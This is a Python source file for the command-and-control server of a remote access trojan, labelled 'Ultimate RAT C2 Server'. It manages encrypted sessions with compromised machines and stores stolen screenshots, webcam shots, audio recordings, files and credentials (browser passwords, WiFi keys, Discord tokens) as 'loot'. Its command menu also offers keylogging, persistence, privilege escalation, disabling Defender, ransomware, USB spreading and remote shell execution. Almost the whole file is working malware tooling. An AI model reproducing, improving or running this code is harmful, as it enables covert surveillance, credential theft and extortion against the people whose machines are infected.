"""
═══════════════════════════════════════════════════════════════
    ULTIMATE RAT C2 SERVER - FIXED & IMPROVED
    Multi-Session Management + Non-Blocking Operations
═══════════════════════════════════════════════════════════════
"""

import socket
import threading
import base64
import os
import signal
import sys
from cryptography.fernet import Fernet
from datetime import datetime
import time
import sys
sys.path.insert(0, os.path.dirname(__file__))

from master_umbrella_setup import get_yaml_config, config_get, ConfigWatcher
from agent_registry import AgentRegistry

# ═══════════════════════════════════════════════════════════════════════════
# INITIALIZATION
# ═══════════════════════════════════════════════════════════════════════════

# Agent registry
agent_registry = AgentRegistry()

# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURATION LOADING
# ═══════════════════════════════════════════════════════════════════════════

config = get_yaml_config()
LISTEN_IP = config.get('server.listen_ip', '0.0.0.0')
LISTEN_PORT = config.get('server.listen_port', 4444)
API_PORT = config.get('server.api_port', 5000)
CALLBACK_TIMEOUT = config.get('server.callback_timeout', 30)
HEARTBEAT_INTERVAL = config.get('server.heartbeat_interval', 30)

# Config watcher for auto-reload
config_watcher = ConfigWatcher(config, check_interval=5)

def on_config_change(new_config):
    """Callback when configuration changes"""
    global LISTEN_IP, LISTEN_PORT, API_PORT, CALLBACK_TIMEOUT, HEARTBEAT_INTERVAL
    print(f"{Colors.YELLOW}[!] Configuration changed, reloading...{Colors.END}")
    LISTEN_IP = config.get('server.listen_ip', LISTEN_IP)
    LISTEN_PORT = config.get('server.listen_port', LISTEN_PORT)
    API_PORT = config.get('server.api_port', API_PORT)
    CALLBACK_TIMEOUT = config.get('server.callback_timeout', CALLBACK_TIMEOUT)
    HEARTBEAT_INTERVAL = config.get('server.heartbeat_interval', HEARTBEAT_INTERVAL)

config_watcher.subscribe(on_config_change)

# ═══════════════════════════════════════════════════════════════
# GLOBAL SESSION MANAGEMENT
# ═══════════════════════════════════════════════════════════════

SESSIONS = {}  # {session_id: {'socket': client_socket, 'addr': addr, 'info': info}}
SESSION_LOCK = threading.Lock()
ACTIVE_SESSION = None
SERVER_RUNNING = True

# ═══════════════════════════════════════════════════════════════
# TERMINAL COLORS
# ═══════════════════════════════════════════════════════════════

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ═══════════════════════════════════════════════════════════════
# ENCRYPTION FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def encrypt_data(key, data):
    f = Fernet(key)
    return f.encrypt(data.encode())

def decrypt_data(key, data):
    f = Fernet(key)
    return f.decrypt(data).decode()

# ═══════════════════════════════════════════════════════════════
# FILE SAVING FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def save_screenshot(data, client_name):
    try:
        os.makedirs('captures/screenshots', exist_ok=True)
        filename = f"captures/screenshots/screenshot_{client_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(data))
        return f"[+] Screenshot saved as {filename}"
    except Exception as e:
        return f"[-] Save failed: {str(e)}"

def save_webcam(data, client_name):
    try:
        os.makedirs('captures/webcam', exist_ok=True)
        filename = f"captures/webcam/webcam_{client_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(data))
        return f"[+] Webcam image saved as {filename}"
    except Exception as e:
        return f"[-] Save failed: {str(e)}"

def save_audio(data, client_name):
    try:
        os.makedirs('captures/audio', exist_ok=True)
        filename = f"captures/audio/audio_{client_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(data))
        return f"[+] Audio saved as {filename}"
    except Exception as e:
        return f"[-] Save failed: {str(e)}"

def save_file(data, filename, client_name):
    try:
        os.makedirs(f'loot/{client_name}', exist_ok=True)
        filepath = f"loot/{client_name}/{filename}"
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(data))
        return f"[+] File saved as {filepath}"
    except Exception as e:
        return f"[-] Save failed: {str(e)}"

def save_credentials(data, client_name, cred_type):
    try:
        os.makedirs(f'loot/{client_name}', exist_ok=True)
        filename = f"loot/{client_name}/{cred_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            f.write(data)
        return f"[+] Credentials saved as {filename}"
    except Exception as e:
        return f"[-] Save failed: {str(e)}"

# ═══════════════════════════════════════════════════════════════
# SESSION MANAGEMENT
# ═══════════════════════════════════════════════════════════════

def add_session(session_id, client_socket, addr, info):
    """Add new session to management"""
    with SESSION_LOCK:
        SESSIONS[session_id] = {
            'socket': client_socket,
            'addr': addr,
            'info': info,
            'connected_at': datetime.now(),
            'active': True
        }
    print(f"{Colors.GREEN}[+] Session {session_id} added{Colors.END}")

def remove_session(session_id):
    """Remove session from management"""
    with SESSION_LOCK:
        if session_id in SESSIONS:
            try:
                SESSIONS[session_id]['socket'].close()
            except:
                pass
            del SESSIONS[session_id]
    print(f"{Colors.RED}[-] Session {session_id} removed{Colors.END}")

def list_sessions():
    """Display all active sessions"""
    with SESSION_LOCK:
        if not SESSIONS:
            print(f"{Colors.YELLOW}[*] No active sessions{Colors.END}")
            return
        
        print(f"\n{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    ACTIVE SESSIONS                           ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}\n")
        
        for sid, session in SESSIONS.items():
            addr = session['addr']
            info = session['info']
            connected_time = session['connected_at'].strftime('%H:%M:%S')
            active_marker = f"{Colors.GREEN}●{Colors.END}" if session['active'] else f"{Colors.RED}●{Colors.END}"
            
            print(f"{active_marker} {Colors.BOLD}[{sid}]{Colors.END} {addr[0]}:{addr[1]} | {info} | Connected: {connected_time}")
        
        print()

def switch_session(session_id):
    """Switch to specific session"""
    global ACTIVE_SESSION
    with SESSION_LOCK:
        if session_id in SESSIONS:
            ACTIVE_SESSION = session_id
            return True
        return False

# ═══════════════════════════════════════════════════════════════
# HELP MENU
# ═══════════════════════════════════════════════════════════════

def print_help():
    help_text = f"""
{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════════════╗
║                    ULTIMATE RAT COMMAND REFERENCE                    ║
╚══════════════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.MAGENTA}{Colors.BOLD}SESSION MANAGEMENT:{Colors.END}
  {Colors.WHITE}sessions{Colors.END}         - List all active sessions
  {Colors.WHITE}use <id>{Colors.END}         - Switch to session ID
  {Colors.WHITE}kill <id>{Colors.END}        - Kill session ID
  {Colors.WHITE}killall{Colors.END}          - Kill all sessions
  {Colors.WHITE}background{Colors.END}       - Background current session
  {Colors.WHITE}clear{Colors.END}            - Clear terminal
  {Colors.WHITE}exit{Colors.END}             - Exit C2 server

{Colors.GREEN}{Colors.BOLD}SYSTEM INFORMATION:{Colors.END}
  {Colors.WHITE}sysinfo{Colors.END}          - Comprehensive system information
  {Colors.WHITE}processes{Colors.END}        - List all running processes
  {Colors.WHITE}metrics{Colors.END}          - Real-time performance metrics
  
{Colors.GREEN}{Colors.BOLD}SURVEILLANCE:{Colors.END}
  {Colors.WHITE}screenshot{Colors.END}       - Capture screen
  {Colors.WHITE}webcam{Colors.END}           - Capture webcam
  {Colors.WHITE}keylogs{Colors.END}          - Retrieve keystrokes
  {Colors.WHITE}record <sec>{Colors.END}     - Record audio
  {Colors.WHITE}clipboard{Colors.END}        - Clipboard monitoring
  {Colors.WHITE}burst <count>{Colors.END}    - Webcam photo burst
  {Colors.WHITE}timelapse <int> <count>{Colors.END} - Screenshot timelapse
  
{Colors.GREEN}{Colors.BOLD}CREDENTIALS:{Colors.END}
  {Colors.WHITE}passwords{Colors.END}        - Browser passwords
  {Colors.WHITE}wifi{Colors.END}             - WiFi passwords
  {Colors.WHITE}discord{Colors.END}          - Discord tokens
  {Colors.WHITE}history <browser>{Colors.END} - Browser history
  
{Colors.GREEN}{Colors.BOLD}FILE OPERATIONS:{Colors.END}
  {Colors.WHITE}download <path>{Colors.END}  - Download file from target
  {Colors.WHITE}upload <path>{Colors.END}    - Upload file to target
  {Colors.WHITE}cd <path>{Colors.END}        - Change directory
  
{Colors.GREEN}{Colors.BOLD}PROCESS MANAGEMENT:{Colors.END}
  {Colors.WHITE}kill <PID>{Colors.END}       - Kill process
  
{Colors.GREEN}{Colors.BOLD}PERSISTENCE:{Colors.END}
  {Colors.WHITE}persist{Colors.END}          - Add persistence
  {Colors.WHITE}elevate{Colors.END}          - Privilege escalation
  {Colors.WHITE}defenderoff{Colors.END}      - Disable Defender
  
{Colors.GREEN}{Colors.BOLD}ADVANCED:{Colors.END}
  {Colors.WHITE}ransom <path>{Colors.END}    - Ransomware simulation
  {Colors.WHITE}spread{Colors.END}           - USB spreading
  {Colors.WHITE}netscan{Colors.END}          - Network scan
  {Colors.WHITE}locate{Colors.END}           - Geolocation
  {Colors.WHITE}software{Colors.END}         - Installed programs
  {Colors.WHITE}usb{Colors.END}              - USB devices
  {Colors.WHITE}selfdestruct{Colors.END}     - Remove all traces
  
{Colors.GREEN}{Colors.BOLD}FUN FEATURES:{Colors.END}
  {Colors.WHITE}msgbox <title>|<msg>{Colors.END} - Display message box
  {Colors.WHITE}beep <freq> <dur>{Colors.END} - Play beep sound
  {Colors.WHITE}lock{Colors.END}             - Lock workstation
  {Colors.WHITE}shutdown <sec>{Colors.END}   - Schedule shutdown
  
{Colors.GREEN}{Colors.BOLD}SHELL:{Colors.END}
  {Colors.WHITE}<command>{Colors.END}        - Execute shell command
"""
    print(help_text)

# ═══════════════════════════════════════════════════════════════
# CLIENT LISTENER THREAD
# ═══════════════════════════════════════════════════════════════

def client_listener(session_id, client_socket, key):
    """Background listener for client - keeps connection alive"""
    try:
        while SERVER_RUNNING and session_id in SESSIONS:
            try:
                # Set timeout so we can check if server is still running
                client_socket.settimeout(1.0)
                data = client_socket.recv(1024)
                if not data:
                    break
            except socket.timeout:
                # Timeout is normal - just continue checking
                continue
            except (BrokenPipeError, ConnectionResetError):
                # Connection lost
                break
            except Exception as e:
                # Other socket errors
                break
    except Exception as e:
        pass
    finally:
        remove_session(session_id)

# ═══════════════════════════════════════════════════════════════
# COMMAND EXECUTOR WITH TIMEOUT
# ═══════════════════════════════════════════════════════════════

def send_command(session_id, key, command, timeout=30):
    """Send command with timeout protection and proper buffer handling"""
    if session_id not in SESSIONS:
        return None, "Session not found"
    
    with SESSION_LOCK:
        if session_id not in SESSIONS:
            return None, "Session not found"
        client_socket = SESSIONS[session_id]['socket']
    
    try:
        # Send command
        encrypted_cmd = encrypt_data(key, command)
        client_socket.send(encrypted_cmd)
        
        # Set timeout for response
        old_timeout = client_socket.gettimeout()
        client_socket.settimeout(timeout)
        
        try:
            # Receive response with proper buffering for large data
            response_buffer = b''
            chunk_size = 1024 * 1024  # 1MB chunks
            max_size = 100 * 1024 * 1024  # 100MB max
            
            while len(response_buffer) < max_size:
                try:
                    chunk = client_socket.recv(chunk_size)
                    if not chunk:
                        break  # Connection closed
                    response_buffer += chunk
                except socket.timeout:
                    # If we got some data, that's okay
                    if response_buffer:
                        break
                    else:
                        raise  # No data received before timeout
            
            if not response_buffer:
                remove_session(session_id)
                return None, "Connection closed"
            
            response = decrypt_data(key, response_buffer)
            return response, None
        finally:
            client_socket.settimeout(old_timeout)
        
    except socket.timeout:
        return None, f"Command timed out after {timeout} seconds"
    except (BrokenPipeError, ConnectionResetError):
        remove_session(session_id)
        return None, "Connection lost"
    except Exception as e:
        return None, f"Error: {str(e)}"

# ═══════════════════════════════════════════════════════════════
# INTERACTIVE SHELL
# ═══════════════════════════════════════════════════════════════

def interactive_shell(session_id, key):
    """Interactive shell for specific session"""
    global ACTIVE_SESSION
    
    if session_id not in SESSIONS:
        print(f"{Colors.RED}[-] Invalid session ID{Colors.END}")
        return
    
    session = SESSIONS[session_id]
    client_socket = session['socket']
    client_name = f"{session['addr'][0]}_{session['addr'][1]}"
    
    print(f"{Colors.GREEN}[*] Interacting with session {session_id}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Type 'background' to return to main menu{Colors.END}\n")
    
    while True:
        try:
            if session_id not in SESSIONS:
                print(f"{Colors.RED}[-] Session disconnected{Colors.END}")
                ACTIVE_SESSION = None
                break
            
            command = input(f"{Colors.CYAN}{Colors.BOLD}RAT[{session_id}]>{Colors.END} ").strip()
            
            if not command:
                continue
            
            # Local commands
            if command.lower() == 'background':
                ACTIVE_SESSION = None
                print(f"{Colors.YELLOW}[*] Backgrounded session {session_id}{Colors.END}")
                break
            
            elif command.lower() == 'help':
                print_help()
                continue
            
            elif command.lower() == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
                continue
            
            # Special commands with longer timeouts
            if command.lower() in ['netscan', 'software']:
                timeout = 120
            elif command.lower().startswith('timelapse'):
                timeout = 300
            else:
                timeout = 30
            
            # Show sending indicator
            print(f"{Colors.YELLOW}[*] Sending command...{Colors.END}", end='\r')
            
            # Send command
            response, error = send_command(session_id, key, command, timeout)
            
            if error:
                print(f"{Colors.RED}[-] {error}{Colors.END}")
                continue
            
            # Clear sending indicator
            print(" " * 50, end='\r')
            
            # ========== SPECIAL RESPONSE HANDLERS ==========
            
            if command.lower() == 'screenshot':
                print(response)
                if "Taking screenshot" in response:
                    print(f"{Colors.YELLOW}[*] Receiving screenshot...{Colors.END}")
                    response_data = client_socket.recv(10 * 1024 * 1024)
                    response = decrypt_data(key, response_data)
                    if not response.startswith('['):
                        print(save_screenshot(response, client_name))
                    else:
                        print(response)
            
            elif command.lower() == 'webcam':
                print(response)
                if "Capturing webcam" in response:
                    print(f"{Colors.YELLOW}[*] Receiving webcam image...{Colors.END}")
                    response_data = client_socket.recv(5 * 1024 * 1024)
                    response = decrypt_data(key, response_data)
                    if not response.startswith('['):
                        print(save_webcam(response, client_name))
                    else:
                        print(response)
            
            elif command.lower().startswith('record '):
                print(response)
                if "Recording audio" in response:
                    print(f"{Colors.YELLOW}[*] Receiving audio...{Colors.END}")
                    response_data = client_socket.recv(20 * 1024 * 1024)
                    response = decrypt_data(key, response_data)
                    if not response.startswith('['):
                        print(save_audio(response, client_name))
                    else:
                        print(response)
            
            elif command.lower() == 'passwords':
                print(response)
                if not response.startswith('[-]'):
                    print(save_credentials(response, client_name, 'browser_passwords'))
            
            elif command.lower() == 'wifi':
                print(response)
                if not response.startswith('[-]'):
                    print(save_credentials(response, client_name, 'wifi_passwords'))
            
            elif command.lower() == 'discord':
                print(response)
                if not response.startswith('[-]'):
                    print(save_credentials(response, client_name, 'discord_tokens'))
            
            elif command.lower().startswith('download '):
                filename = command.split()[1].split('\\')[-1].split('/')[-1]
                if not response.startswith('[-]'):
                    print(save_file(response, filename, client_name))
                else:
                    print(response)
            
            elif command.lower() == 'exit':
                send_command(session_id, key, 'exit', 5)
                remove_session(session_id)
                ACTIVE_SESSION = None
                break
            
            else:
                print(response)
        
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Use 'background' to return or 'exit' to close session{Colors.END}")
            continue
        except Exception as e:
            print(f"{Colors.RED}[-] Error: {str(e)}{Colors.END}")

# ═══════════════════════════════════════════════════════════════
# CONNECTION HANDLER
# ═══════════════════════════════════════════════════════════════

def handle_new_connection(client_socket, key, addr):
    """Handle new incoming connection"""
    try:
        # Receive initial info
        client_socket.settimeout(10)
        welcome_data = client_socket.recv(8192)
        welcome = decrypt_data(key, welcome_data)
        
        # Generate session ID
        session_id = len(SESSIONS) + 1
        
        # Add to sessions
        add_session(session_id, client_socket, addr, welcome)
        
        # Start background listener
        listener_thread = threading.Thread(
            target=client_listener,
            args=(session_id, client_socket, key),
            daemon=True
        )
        listener_thread.start()
        
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"\n{Colors.GREEN}{Colors.BOLD}[{timestamp}] [Session {session_id}] {welcome}{Colors.END}")
        print(f"{Colors.YELLOW}[*] Use 'sessions' to list all connections{Colors.END}")
        print(f"{Colors.YELLOW}[*] Use 'use {session_id}' to interact with this session{Colors.END}\n")
        
    except Exception as e:
        print(f"{Colors.RED}[-] Connection handler error: {str(e)}{Colors.END}")
        try:
            client_socket.close()
        except:
            pass

# ═══════════════════════════════════════════════════════════════
# SIGNAL HANDLER
# ═══════════════════════════════════════════════════════════════

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    global SERVER_RUNNING
    print(f"\n{Colors.YELLOW}[*] Shutting down server...{Colors.END}")
    SERVER_RUNNING = False
    
    # Close all sessions
    with SESSION_LOCK:
        for session_id in list(SESSIONS.keys()):
            try:
                SESSIONS[session_id]['socket'].close()
            except:
                pass
    
    print(f"{Colors.GREEN}[+] Server stopped{Colors.END}")
    sys.exit(0)

# ═══════════════════════════════════════════════════════════════
# MAIN SERVER
# ═══════════════════════════════════════════════════════════════

def main():
    global SERVER_RUNNING
    
    # Setup signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Load configuration from master config
    KEY = config.get('security.master_encryption_key', b'HBotDwpxC89EIMiuA6PA_8NI81hWHqGC6hiG0DbfUDY=')
    PORT = LISTEN_PORT
    HOST = LISTEN_IP
    
    # Banner
    banner = rf"""{Colors.CYAN}{Colors.BOLD}
    
           _   _          _                     ____   __  _____ 
          | | | |_  _____| | _____ _ __        |___ \ / /_|___ / 
          | |_| \ \/ / __| |/ / _ \ '__| ____    __) | '_ \ |_ \ 
          |  _  |>  < (__|   <  __/ |   |____|  / __/| (_) |__) |
          |_| |_/_/\_\___|_|\_\___|_|          |_____|\___/____/ 
    ╔═══════════════════════════════════════════════════════════════════╗
    ║          ULTIMATE RAT C2 SERVER - COMPETITION EDITION             ║
    ║              Professional Command & Control System                ║
    ║                    International Grade v1.0                       ║
    ╚═══════════════════════════════════════════════════════════════════╝
    {Colors.END}"""
    
    print(banner)
    
    # Start configuration watcher
    config_watcher.start_watching()
    print(f"{Colors.GREEN}[+] Configuration watcher active{Colors.END}")
    
    # Create directories
    os.makedirs('captures/screenshots', exist_ok=True)
    os.makedirs('captures/webcam', exist_ok=True)
    os.makedirs('captures/audio', exist_ok=True)
    os.makedirs('loot', exist_ok=True)
    os.makedirs('logs/server', exist_ok=True)
    os.makedirs('data/backups', exist_ok=True)
    
    # Setup server with config
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, config.get('server.buffer_size', 65536))
    server.bind((HOST, PORT))
    server.listen(config.get('server.max_concurrent_agents', 1000))
    server.settimeout(1.0)  # Non-blocking with timeout
    
    print(f"{Colors.GREEN}[*] Server listening on {HOST}:{PORT}{Colors.END}")
    print(f"{Colors.GREEN}[*] API available on 0.0.0.0:{API_PORT}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Type 'help' for command reference{Colors.END}\n")
    
    # Start connection acceptor thread
    def accept_connections():
        while SERVER_RUNNING:
            try:
                client, addr = server.accept()
                threading.Thread(
                    target=handle_new_connection,
                    args=(client, KEY, addr),
                    daemon=True
                ).start()
            except socket.timeout:
                continue
            except:
                if SERVER_RUNNING:
                    continue
    
    acceptor_thread = threading.Thread(target=accept_connections, daemon=True)
    acceptor_thread.start()
    
    # Main command loop
    while SERVER_RUNNING:
        try:
            command = input(f"{Colors.MAGENTA}{Colors.BOLD}C2>{Colors.END} ").strip()
            
            if not command:
                continue
            
            # Command routing
            if command.lower() == 'help':
                print_help()
            
            elif command.lower() == 'sessions':
                list_sessions()
            
            elif command.lower().startswith('use '):
                try:
                    session_id = int(command.split()[1])
                    if switch_session(session_id):
                        interactive_shell(session_id, KEY)
                    else:
                        print(f"{Colors.RED}[-] Invalid session ID{Colors.END}")
                except:
                    print(f"{Colors.RED}[-] Usage: use <session_id>{Colors.END}")
            
            elif command.lower().startswith('kill '):
                try:
                    session_id = int(command.split()[1])
                    remove_session(session_id)
                    print(f"{Colors.GREEN}[+] Session {session_id} killed{Colors.END}")
                except:
                    print(f"{Colors.RED}[-] Usage: kill <session_id>{Colors.END}")
            
            elif command.lower() == 'killall':
                with SESSION_LOCK:
                    for session_id in list(SESSIONS.keys()):
                        remove_session(session_id)
                print(f"{Colors.GREEN}[+] All sessions killed{Colors.END}")
            
            elif command.lower() == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
            
            elif command.lower() == 'exit':
                signal_handler(None, None)
            
            else:
                print(f"{Colors.RED}[-] Unknown command. Type 'help' for command reference{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[-] Error: {str(e)}{Colors.END}")

if __name__ == "__main__":
    main()